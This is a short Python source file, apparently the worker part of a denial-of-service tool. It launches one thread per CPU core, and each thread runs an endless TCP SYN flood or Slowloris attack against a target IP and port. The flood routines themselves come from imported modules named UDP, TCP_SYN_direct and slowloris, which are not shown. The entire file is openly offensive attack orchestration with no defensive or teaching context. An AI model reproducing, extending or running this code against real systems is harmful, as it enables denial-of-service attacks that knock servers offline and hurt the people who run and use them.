from __future__ import print_function
import multiprocessing as mp
import threading
import UDP
import TCP_SYN_direct as tsd
import slowloris as sls


def tcp_attack(ip,port):
	#print("called")
	#substitude with actual attack
	while 1:
		tsd.TCP_SYN(ip,port)
		print("TCP:Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))

def slowloris_attack(ip,port):
	while 1:
		sls.start_slowloris(ip,port,1000)
		print("Slowloris: Attacking on %s : %s on %s"%(ip,port,threading.current_thread().name))

def enable_threading_attack_tcp(num_cpu,ip,port):
	for _ in range(num_cpu):
		t = threading.Thread(target=tcp_attack,args=(ip,port,))
		t.daemon = True
		t.start()

def enable_threading_attack_http(num_cpu,ip,port):
	for _ in range(num_cpu):
		t = threading.Thread(target=slowloris_attack,args=(ip,port,))
		t.start()

def start_attack_in_multithreading(method,ip,port):
	num_cpu = mp.cpu_count()
	if method == 'tcp':
		print('mode: tcp')
		enable_threading_attack_tcp(num_cpu,ip,port)
	elif method == 'slowloris':
		print('mode: slowloris')
		enable_threading_attack_http(num_cpu,ip,port)


#start_attack_in_multithreading('slowloris','111','80')
#for worker to attack




#start_attack_in_multithreading("192.168.1.1")
